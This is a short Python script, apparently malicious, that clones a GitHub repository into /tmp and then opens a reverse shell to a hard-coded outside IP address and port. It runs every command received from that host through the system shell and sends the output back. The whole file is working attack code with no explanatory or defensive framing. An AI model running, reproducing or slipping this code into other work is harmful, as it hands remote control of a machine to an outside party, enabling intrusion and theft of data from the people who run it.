import os
import subprocess
import socket
import sys
import time
import pty

# Target GitHub repository
REPO_URL = "https://github.com/uybenchify1/test2"
CLONE_DIR = "/tmp/test2"

def clone_repo():
    """ Clone or update the GitHub repository. """
    if os.path.exists(CLONE_DIR):
        subprocess.call(["rm", "-rf", CLONE_DIR])
    subprocess.call(["git", "clone", REPO_URL, CLONE_DIR])

def reverse_shell():
    """ Open a reverse shell and connect to the given IP/port. """
    IP = "212.132.64.73"
    PORT = 4243

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send(b"[+] Connection established!\n")

        # Try to spawn a bash shell
        try:
            pty.spawn("/bin/bash")
        except:
            s.send(b"[-] PTY shell failed, using fallback!\n")

        while True:
            s.send(b"$ ")
            command = s.recv(1024).decode("utf-8").strip()
            if command.lower() in ["exit", "quit"]:
                break

            if command:
                try:
                    output = subprocess.run(command, shell=True, capture_output=True)
                    s.send(output.stdout + output.stderr)
                except Exception as e:
                    s.send(str(e).encode())

        s.close()
    except Exception as e:
        sys.exit(1)

if __name__ == "__main__":
    clone_repo()
    time.sleep(2)  # Add a delay
    reverse_shell()
